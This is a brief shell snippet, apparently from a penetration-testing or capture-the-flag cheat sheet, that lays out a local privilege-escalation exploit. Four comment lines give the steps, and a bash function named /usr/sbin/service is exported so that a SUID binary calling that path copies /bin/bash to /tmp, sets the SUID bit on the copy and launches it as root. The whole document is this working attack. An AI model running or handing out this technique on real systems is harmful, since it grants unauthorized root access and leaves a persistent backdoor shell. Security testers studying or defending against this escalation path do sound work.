# 1. Declare the function at the command line
# 2. Make the current directory first on PATH just to be safe
# 3. export -f /function/path/name
# 4. execute the SUID binary that calls the malicious function

function /usr/sbin/service() { cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p; }

